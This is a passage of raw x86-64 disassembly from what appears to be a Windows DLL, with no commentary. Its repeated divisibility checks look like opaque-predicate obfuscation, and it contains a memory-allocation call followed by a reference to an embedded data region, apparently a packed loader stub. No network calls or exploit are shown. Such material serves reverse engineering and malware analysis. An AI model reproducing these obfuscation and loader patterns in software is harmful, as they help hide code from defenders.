   18000172c:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001732:	03 c3                	add    %ebx,%eax
   180001734:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000173a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001740:	41 23 c3             	and    %r11d,%eax
   180001743:	7d 07                	jge    0x18000174c
   180001745:	2b c3                	sub    %ebx,%eax
   180001747:	41 0b c6             	or     %r14d,%eax
   18000174a:	03 c3                	add    %ebx,%eax
   18000174c:	85 c0                	test   %eax,%eax
   18000174e:	74 ce                	je     0x18000171e
   180001750:	41 b9 fe ff ff ff    	mov    $0xfffffffe,%r9d
   180001756:	41 ba 01 00 00 80    	mov    $0x80000001,%r10d
   18000175c:	eb 68                	jmp    0x1800017c6
   18000175e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001764:	41 8b cf             	mov    %r15d,%ecx
   180001767:	2b 0d ab 78 02 00    	sub    0x278ab(%rip),%ecx        # 0x180029018
   18000176d:	41 ba 01 00 00 80    	mov    $0x80000001,%r10d
   180001773:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001779:	41 b9 fe ff ff ff    	mov    $0xfffffffe,%r9d
   18000177f:	03 c1                	add    %ecx,%eax
   180001781:	eb 16                	jmp    0x180001799
   180001783:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001789:	03 c3                	add    %ebx,%eax
   18000178b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001791:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001797:	03 c3                	add    %ebx,%eax
   180001799:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000179f:	41 8b c4             	mov    %r12d,%eax
   1800017a2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800017a8:	f7 e9                	imul   %ecx
   1800017aa:	8b c2                	mov    %edx,%eax
   1800017ac:	c1 e8 1f             	shr    $0x1f,%eax
   1800017af:	03 d0                	add    %eax,%edx
   1800017b1:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800017b4:	3b c8                	cmp    %eax,%ecx
   1800017b6:	74 cb                	je     0x180001783
   1800017b8:	41 bb 03 00 00 80    	mov    $0x80000003,%r11d
   1800017be:	eb 06                	jmp    0x1800017c6
   1800017c0:	41 b8 e9 f4 2c 00    	mov    $0x2cf4e9,%r8d
   1800017c6:	44 89 85 80 01 00 00 	mov    %r8d,0x180(%rbp)
   1800017cd:	44 89 85 88 01 00 00 	mov    %r8d,0x188(%rbp)
   1800017d4:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800017da:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800017e0:	03 c8                	add    %eax,%ecx
   1800017e2:	41 8b c4             	mov    %r12d,%eax
   1800017e5:	f7 e9                	imul   %ecx
   1800017e7:	8b c2                	mov    %edx,%eax
   1800017e9:	c1 e8 1f             	shr    $0x1f,%eax
   1800017ec:	03 d0                	add    %eax,%edx
   1800017ee:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800017f1:	3b c8                	cmp    %eax,%ecx
   1800017f3:	74 4a                	je     0x18000183f
   1800017f5:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800017fb:	41 03 cf             	add    %r15d,%ecx
   1800017fe:	03 ce                	add    %esi,%ecx
   180001800:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001806:	eb 1c                	jmp    0x180001824
   180001808:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000180e:	03 c3                	add    %ebx,%eax
   180001810:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001816:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000181c:	03 c3                	add    %ebx,%eax
   18000181e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001824:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000182a:	41 23 c3             	and    %r11d,%eax
   18000182d:	7d 07                	jge    0x180001836
   18000182f:	2b c3                	sub    %ebx,%eax
   180001831:	41 0b c6             	or     %r14d,%eax
   180001834:	03 c3                	add    %ebx,%eax
   180001836:	85 c0                	test   %eax,%eax
   180001838:	74 ce                	je     0x180001808
   18000183a:	e9 5f 01 00 00       	jmp    0x18000199e
   18000183f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001845:	41 23 c2             	and    %r10d,%eax
   180001848:	7d 07                	jge    0x180001851
   18000184a:	2b c3                	sub    %ebx,%eax
   18000184c:	41 0b c1             	or     %r9d,%eax
   18000184f:	03 c3                	add    %ebx,%eax
   180001851:	85 c0                	test   %eax,%eax
   180001853:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001859:	74 49                	je     0x1800018a4
   18000185b:	41 8b cf             	mov    %r15d,%ecx
   18000185e:	2b ce                	sub    %esi,%ecx
   180001860:	03 c8                	add    %eax,%ecx
   180001862:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001868:	eb 1c                	jmp    0x180001886
   18000186a:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001870:	03 c3                	add    %ebx,%eax
   180001872:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001878:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000187e:	03 c3                	add    %ebx,%eax
   180001880:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001886:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000188c:	41 8b c4             	mov    %r12d,%eax
   18000188f:	f7 e9                	imul   %ecx
   180001891:	8b c2                	mov    %edx,%eax
   180001893:	c1 e8 1f             	shr    $0x1f,%eax
   180001896:	03 d0                	add    %eax,%edx
   180001898:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000189b:	3b c8                	cmp    %eax,%ecx
   18000189d:	74 cb                	je     0x18000186a
   18000189f:	e9 fa 00 00 00       	jmp    0x18000199e
   1800018a4:	41 23 c3             	and    %r11d,%eax
   1800018a7:	7d 07                	jge    0x1800018b0
   1800018a9:	2b c3                	sub    %ebx,%eax
   1800018ab:	41 0b c6             	or     %r14d,%eax
   1800018ae:	03 c3                	add    %ebx,%eax
   1800018b0:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800018b6:	85 c0                	test   %eax,%eax
   1800018b8:	74 66                	je     0x180001920
   1800018ba:	41 03 cf             	add    %r15d,%ecx
   1800018bd:	8d 46 03             	lea    0x3(%rsi),%eax
   1800018c0:	0f af c8             	imul   %eax,%ecx
   1800018c3:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800018c9:	eb 3d                	jmp    0x180001908
   1800018cb:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800018d1:	03 c3                	add    %ebx,%eax
   1800018d3:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800018d9:	b8 67 66 66 66       	mov    $0x66666667,%eax
   1800018de:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800018e4:	f7 e9                	imul   %ecx
   1800018e6:	d1 fa                	sar    $1,%edx
   1800018e8:	8b c2                	mov    %edx,%eax
   1800018ea:	c1 e8 1f             	shr    $0x1f,%eax
   1800018ed:	03 d0                	add    %eax,%edx
   1800018ef:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800018f2:	3b c8                	cmp    %eax,%ecx
   1800018f4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800018fa:	74 04                	je     0x180001900
   1800018fc:	2b c3                	sub    %ebx,%eax
   1800018fe:	eb 02                	jmp    0x180001902
   180001900:	03 c3                	add    %ebx,%eax
   180001902:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001908:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000190e:	41 23 c2             	and    %r10d,%eax
   180001911:	7d 07                	jge    0x18000191a
   180001913:	2b c3                	sub    %ebx,%eax
   180001915:	41 0b c1             	or     %r9d,%eax
   180001918:	03 c3                	add    %ebx,%eax
   18000191a:	85 c0                	test   %eax,%eax
   18000191c:	74 ad                	je     0x1800018cb
   18000191e:	eb 7e                	jmp    0x18000199e
   180001920:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180001925:	f7 e9                	imul   %ecx
   180001927:	d1 fa                	sar    $1,%edx
   180001929:	8b c2                	mov    %edx,%eax
   18000192b:	c1 e8 1f             	shr    $0x1f,%eax
   18000192e:	03 d0                	add    %eax,%edx
   180001930:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001933:	3b c8                	cmp    %eax,%ecx
   180001935:	74 67                	je     0x18000199e
   180001937:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000193d:	8d 4e 17             	lea    0x17(%rsi),%ecx
   180001940:	83 c0 0b             	add    $0xb,%eax
   180001943:	99                   	cltd
   180001944:	f7 f9                	idiv   %ecx
   180001946:	eb 37                	jmp    0x18000197f
   180001948:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000194e:	03 c3                	add    %ebx,%eax
   180001950:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001956:	b8 67 66 66 66       	mov    $0x66666667,%eax
   18000195b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001961:	f7 e9                	imul   %ecx
   180001963:	d1 fa                	sar    $1,%edx
   180001965:	8b c2                	mov    %edx,%eax
   180001967:	c1 e8 1f             	shr    $0x1f,%eax
   18000196a:	03 d0                	add    %eax,%edx
   18000196c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000196f:	3b c8                	cmp    %eax,%ecx
   180001971:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001977:	74 04                	je     0x18000197d
   180001979:	03 c3                	add    %ebx,%eax
   18000197b:	eb 02                	jmp    0x18000197f
   18000197d:	2b c3                	sub    %ebx,%eax
   18000197f:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001985:	41 8b c4             	mov    %r12d,%eax
   180001988:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000198e:	f7 e9                	imul   %ecx
   180001990:	8b c2                	mov    %edx,%eax
   180001992:	c1 e8 1f             	shr    $0x1f,%eax
   180001995:	03 d0                	add    %eax,%edx
   180001997:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000199a:	3b c8                	cmp    %eax,%ecx
   18000199c:	74 aa                	je     0x180001948
   18000199e:	8b 15 60 36 02 00    	mov    0x23660(%rip),%edx        # 0x180025004
   1800019a4:	33 c9                	xor    %ecx,%ecx
   1800019a6:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   1800019ac:	44 8d 49 04          	lea    0x4(%rcx),%r9d
   1800019b0:	ff 15 92 76 02 00    	call   *0x27692(%rip)        # 0x180029048
   1800019b6:	48 89 05 5b 76 02 00 	mov    %rax,0x2765b(%rip)        # 0x180029018
   1800019bd:	41 b9 e9 f4 2c 00    	mov    $0x2cf4e9,%r9d
   1800019c3:	44 89 8d 80 01 00 00 	mov    %r9d,0x180(%rbp)
   1800019ca:	44 89 8d 88 01 00 00 	mov    %r9d,0x188(%rbp)
   1800019d1:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800019d7:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800019dd:	03 c8                	add    %eax,%ecx
   1800019df:	41 8b c4             	mov    %r12d,%eax
   1800019e2:	f7 e9                	imul   %ecx
   1800019e4:	8b c2                	mov    %edx,%eax
   1800019e6:	c1 e8 1f             	shr    $0x1f,%eax
   1800019e9:	03 d0                	add    %eax,%edx
   1800019eb:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800019ee:	3b c8                	cmp    %eax,%ecx
   1800019f0:	74 53                	je     0x180001a45
   1800019f2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800019f8:	41 bb 03 00 00 80    	mov    $0x80000003,%r11d
   1800019fe:	41 03 cf             	add    %r15d,%ecx
   180001a01:	03 ce                	add    %esi,%ecx
   180001a03:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001a09:	eb 1c                	jmp    0x180001a27
   180001a0b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001a11:	03 c3                	add    %ebx,%eax
   180001a13:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001a19:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001a1f:	03 c3                	add    %ebx,%eax
   180001a21:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001a27:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001a2d:	41 23 c3             	and    %r11d,%eax
   180001a30:	7d 07                	jge    0x180001a39
   180001a32:	2b c3                	sub    %ebx,%eax
   180001a34:	41 0b c6             	or     %r14d,%eax
   180001a37:	03 c3                	add    %ebx,%eax
   180001a39:	85 c0                	test   %eax,%eax
   180001a3b:	74 ce                	je     0x180001a0b
   180001a3d:	41 ba 01 00 00 80    	mov    $0x80000001,%r10d
   180001a43:	eb 5c                	jmp    0x180001aa1
   180001a45:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001a4b:	41 8b cf             	mov    %r15d,%ecx
   180001a4e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001a54:	2b ce                	sub    %esi,%ecx
   180001a56:	03 c8                	add    %eax,%ecx
   180001a58:	41 ba 01 00 00 80    	mov    $0x80000001,%r10d
   180001a5e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001a64:	eb 1c                	jmp    0x180001a82
   180001a66:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001a6c:	03 c3                	add    %ebx,%eax
   180001a6e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001a74:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001a7a:	03 c3                	add    %ebx,%eax
   180001a7c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001a82:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001a88:	41 8b c4             	mov    %r12d,%eax
   180001a8b:	f7 e9                	imul   %ecx
   180001a8d:	8b c2                	mov    %edx,%eax
   180001a8f:	c1 e8 1f             	shr    $0x1f,%eax
   180001a92:	03 d0                	add    %eax,%edx
   180001a94:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001a97:	3b c8                	cmp    %eax,%ecx
   180001a99:	74 cb                	je     0x180001a66
   180001a9b:	41 bb 03 00 00 80    	mov    $0x80000003,%r11d
   180001aa1:	48 83 3d 6f 75 02 00 	cmpq   $0x0,0x2756f(%rip)        # 0x180029018
   180001aa8:	00 
   180001aa9:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
   180001aaf:	0f 84 8d 59 00 00    	je     0x180007442
   180001ab5:	44 89 8d 80 01 00 00 	mov    %r9d,0x180(%rbp)
   180001abc:	44 89 8d 88 01 00 00 	mov    %r9d,0x188(%rbp)
   180001ac3:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180001ac9:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001acf:	03 c8                	add    %eax,%ecx
   180001ad1:	41 8b c4             	mov    %r12d,%eax
   180001ad4:	f7 e9                	imul   %ecx
   180001ad6:	8b c2                	mov    %edx,%eax
   180001ad8:	c1 e8 1f             	shr    $0x1f,%eax
   180001adb:	03 d0                	add    %eax,%edx
   180001add:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001ae0:	3b c8                	cmp    %eax,%ecx
   180001ae2:	74 4b                	je     0x180001b2f
   180001ae4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001aea:	41 03 cf             	add    %r15d,%ecx
   180001aed:	41 03 cd             	add    %r13d,%ecx
   180001af0:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001af6:	eb 1c                	jmp    0x180001b14
   180001af8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001afe:	03 c3                	add    %ebx,%eax
   180001b00:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001b06:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001b0c:	03 c3                	add    %ebx,%eax
   180001b0e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001b14:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001b1a:	41 23 c3             	and    %r11d,%eax
   180001b1d:	7d 07                	jge    0x180001b26
   180001b1f:	2b c3                	sub    %ebx,%eax
   180001b21:	41 0b c6             	or     %r14d,%eax
   180001b24:	03 c3                	add    %ebx,%eax
   180001b26:	85 c0                	test   %eax,%eax
   180001b28:	74 ce                	je     0x180001af8
   180001b2a:	e9 5c 01 00 00       	jmp    0x180001c8b
   180001b2f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001b35:	41 23 c2             	and    %r10d,%eax
   180001b38:	7d 07                	jge    0x180001b41
   180001b3a:	2b c3                	sub    %ebx,%eax
   180001b3c:	83 c8 fe             	or     $0xfffffffe,%eax
   180001b3f:	03 c3                	add    %ebx,%eax
   180001b41:	85 c0                	test   %eax,%eax
   180001b43:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001b49:	74 4a                	je     0x180001b95
   180001b4b:	41 8b cf             	mov    %r15d,%ecx
   180001b4e:	41 2b cd             	sub    %r13d,%ecx
   180001b51:	03 c8                	add    %eax,%ecx
   180001b53:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001b59:	eb 1c                	jmp    0x180001b77
   180001b5b:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001b61:	03 c3                	add    %ebx,%eax
   180001b63:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001b69:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001b6f:	03 c3                	add    %ebx,%eax
   180001b71:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001b77:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001b7d:	41 8b c4             	mov    %r12d,%eax
   180001b80:	f7 e9                	imul   %ecx
   180001b82:	8b c2                	mov    %edx,%eax
   180001b84:	c1 e8 1f             	shr    $0x1f,%eax
   180001b87:	03 d0                	add    %eax,%edx
   180001b89:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001b8c:	3b c8                	cmp    %eax,%ecx
   180001b8e:	74 cb                	je     0x180001b5b
   180001b90:	e9 f6 00 00 00       	jmp    0x180001c8b
   180001b95:	41 23 c3             	and    %r11d,%eax
   180001b98:	7d 07                	jge    0x180001ba1
   180001b9a:	2b c3                	sub    %ebx,%eax
   180001b9c:	41 0b c6             	or     %r14d,%eax
   180001b9f:	03 c3                	add    %ebx,%eax
   180001ba1:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001ba7:	85 c0                	test   %eax,%eax
   180001ba9:	74 65                	je     0x180001c10
   180001bab:	41 03 cf             	add    %r15d,%ecx
   180001bae:	41 8d 45 03          	lea    0x3(%r13),%eax
   180001bb2:	0f af c8             	imul   %eax,%ecx
   180001bb5:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001bbb:	eb 3b                	jmp    0x180001bf8
   180001bbd:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001bc3:	03 c3                	add    %ebx,%eax
   180001bc5:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001bcb:	41 8b c0             	mov    %r8d,%eax
   180001bce:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001bd4:	f7 e9                	imul   %ecx
   180001bd6:	d1 fa                	sar    $1,%edx
   180001bd8:	8b c2                	mov    %edx,%eax
   180001bda:	c1 e8 1f             	shr    $0x1f,%eax
   180001bdd:	03 d0                	add    %eax,%edx
   180001bdf:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001be2:	3b c8                	cmp    %eax,%ecx
   180001be4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001bea:	74 04                	je     0x180001bf0
   180001bec:	2b c3                	sub    %ebx,%eax
   180001bee:	eb 02                	jmp    0x180001bf2
   180001bf0:	03 c3                	add    %ebx,%eax
   180001bf2:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001bf8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001bfe:	41 23 c2             	and    %r10d,%eax
   180001c01:	7d 07                	jge    0x180001c0a
   180001c03:	2b c3                	sub    %ebx,%eax
   180001c05:	83 c8 fe             	or     $0xfffffffe,%eax
   180001c08:	03 c3                	add    %ebx,%eax
   180001c0a:	85 c0                	test   %eax,%eax
   180001c0c:	74 af                	je     0x180001bbd
   180001c0e:	eb 7b                	jmp    0x180001c8b
   180001c10:	41 8b c0             	mov    %r8d,%eax
   180001c13:	f7 e9                	imul   %ecx
   180001c15:	d1 fa                	sar    $1,%edx
   180001c17:	8b c2                	mov    %edx,%eax
   180001c19:	c1 e8 1f             	shr    $0x1f,%eax
   180001c1c:	03 d0                	add    %eax,%edx
   180001c1e:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001c21:	3b c8                	cmp    %eax,%ecx
   180001c23:	74 66                	je     0x180001c8b
   180001c25:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001c2b:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180001c2f:	83 c0 0b             	add    $0xb,%eax
   180001c32:	99                   	cltd
   180001c33:	f7 f9                	idiv   %ecx
   180001c35:	eb 35                	jmp    0x180001c6c
   180001c37:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001c3d:	03 c3                	add    %ebx,%eax
   180001c3f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001c45:	41 8b c0             	mov    %r8d,%eax
   180001c48:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001c4e:	f7 e9                	imul   %ecx
   180001c50:	d1 fa                	sar    $1,%edx
   180001c52:	8b c2                	mov    %edx,%eax
   180001c54:	c1 e8 1f             	shr    $0x1f,%eax
   180001c57:	03 d0                	add    %eax,%edx
   180001c59:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001c5c:	3b c8                	cmp    %eax,%ecx
   180001c5e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001c64:	74 04                	je     0x180001c6a
   180001c66:	03 c3                	add    %ebx,%eax
   180001c68:	eb 02                	jmp    0x180001c6c
   180001c6a:	2b c3                	sub    %ebx,%eax
   180001c6c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001c72:	41 8b c4             	mov    %r12d,%eax
   180001c75:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001c7b:	f7 e9                	imul   %ecx
   180001c7d:	8b c2                	mov    %edx,%eax
   180001c7f:	c1 e8 1f             	shr    $0x1f,%eax
   180001c82:	03 d0                	add    %eax,%edx
   180001c84:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001c87:	3b c8                	cmp    %eax,%ecx
   180001c89:	74 ac                	je     0x180001c37
   180001c8b:	44 89 8d 80 01 00 00 	mov    %r9d,0x180(%rbp)
   180001c92:	48 8d 35 67 e3 01 00 	lea    0x1e367(%rip),%rsi        # 0x180020000
   180001c99:	44 89 8d 88 01 00 00 	mov    %r9d,0x188(%rbp)
   180001ca0:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180001ca6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001cac:	03 c8                	add    %eax,%ecx
   180001cae:	41 8b c4             	mov    %r12d,%eax
   180001cb1:	f7 e9                	imul   %ecx
   180001cb3:	8b c2                	mov    %edx,%eax
   180001cb5:	c1 e8 1f             	shr    $0x1f,%eax
   180001cb8:	03 d0                	add    %eax,%edx
   180001cba:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001cbd:	3b c8                	cmp    %eax,%ecx
   180001cbf:	74 4b                	je     0x180001d0c
   180001cc1:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001cc7:	41 03 cf             	add    %r15d,%ecx
   180001cca:	41 03 cd             	add    %r13d,%ecx
   180001ccd:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001cd3:	eb 1c                	jmp    0x180001cf1
   180001cd5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001cdb:	03 c3                	add    %ebx,%eax
   180001cdd:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001ce3:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001ce9:	03 c3                	add    %ebx,%eax
   180001ceb:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001cf1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001cf7:	41 23 c3             	and    %r11d,%eax
   180001cfa:	7d 07                	jge    0x180001d03
   180001cfc:	2b c3                	sub    %ebx,%eax
   180001cfe:	41 0b c6             	or     %r14d,%eax
   180001d01:	03 c3                	add    %ebx,%eax
   180001d03:	85 c0                	test   %eax,%eax
   180001d05:	74 ce                	je     0x180001cd5
   180001d07:	e9 5c 01 00 00       	jmp    0x180001e68
   180001d0c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001d12:	41 23 c2             	and    %r10d,%eax
   180001d15:	7d 07                	jge    0x180001d1e
   180001d17:	2b c3                	sub    %ebx,%eax
   180001d19:	83 c8 fe             	or     $0xfffffffe,%eax
   180001d1c:	03 c3                	add    %ebx,%eax
   180001d1e:	85 c0                	test   %eax,%eax
   180001d20:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001d26:	74 4a                	je     0x180001d72
   180001d28:	41 8b cf             	mov    %r15d,%ecx
   180001d2b:	41 2b cd             	sub    %r13d,%ecx
   180001d2e:	03 c8                	add    %eax,%ecx
   180001d30:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001d36:	eb 1c                	jmp    0x180001d54
   180001d38:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001d3e:	03 c3                	add    %ebx,%eax
   180001d40:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001d46:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001d4c:	03 c3                	add    %ebx,%eax
   180001d4e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001d54:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001d5a:	41 8b c4             	mov    %r12d,%eax
   180001d5d:	f7 e9                	imul   %ecx
   180001d5f:	8b c2                	mov    %edx,%eax
   180001d61:	c1 e8 1f             	shr    $0x1f,%eax
   180001d64:	03 d0                	add    %eax,%edx
   180001d66:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001d69:	3b c8                	cmp    %eax,%ecx
   180001d6b:	74 cb                	je     0x180001d38
   180001d6d:	e9 f6 00 00 00       	jmp    0x180001e68
   180001d72:	41 23 c3             	and    %r11d,%eax
   180001d75:	7d 07                	jge    0x180001d7e
   180001d77:	2b c3                	sub    %ebx,%eax
   180001d79:	41 0b c6             	or     %r14d,%eax
   180001d7c:	03 c3                	add    %ebx,%eax
   180001d7e:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001d84:	85 c0                	test   %eax,%eax
   180001d86:	74 65                	je     0x180001ded
   180001d88:	41 03 cf             	add    %r15d,%ecx
   180001d8b:	41 8d 45 03          	lea    0x3(%r13),%eax
   180001d8f:	0f af c8             	imul   %eax,%ecx
   180001d92:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001d98:	eb 3b                	jmp    0x180001dd5
   180001d9a:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001da0:	03 c3                	add    %ebx,%eax
   180001da2:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001da8:	41 8b c0             	mov    %r8d,%eax
   180001dab:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001db1:	f7 e9                	imul   %ecx
   180001db3:	d1 fa                	sar    $1,%edx
   180001db5:	8b c2                	mov    %edx,%eax
   180001db7:	c1 e8 1f             	shr    $0x1f,%eax
   180001dba:	03 d0                	add    %eax,%edx
   180001dbc:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001dbf:	3b c8                	cmp    %eax,%ecx
   180001dc1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001dc7:	74 04                	je     0x180001dcd
   180001dc9:	2b c3                	sub    %ebx,%eax
   180001dcb:	eb 02                	jmp    0x180001dcf
   180001dcd:	03 c3                	add    %ebx,%eax
   180001dcf:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001dd5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001ddb:	41 23 c2             	and    %r10d,%eax
   180001dde:	7d 07                	jge    0x180001de7
   180001de0:	2b c3                	sub    %ebx,%eax
   180001de2:	83 c8 fe             	or     $0xfffffffe,%eax
   180001de5:	03 c3                	add    %ebx,%eax
   180001de7:	85 c0                	test   %eax,%eax
   180001de9:	74 af                	je     0x180001d9a
   180001deb:	eb 7b                	jmp    0x180001e68
   180001ded:	41 8b c0             	mov    %r8d,%eax
   180001df0:	f7 e9                	imul   %ecx
   180001df2:	d1 fa                	sar    $1,%edx
   180001df4:	8b c2                	mov    %edx,%eax
   180001df6:	c1 e8 1f             	shr    $0x1f,%eax
   180001df9:	03 d0                	add    %eax,%edx
   180001dfb:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001dfe:	3b c8                	cmp    %eax,%ecx
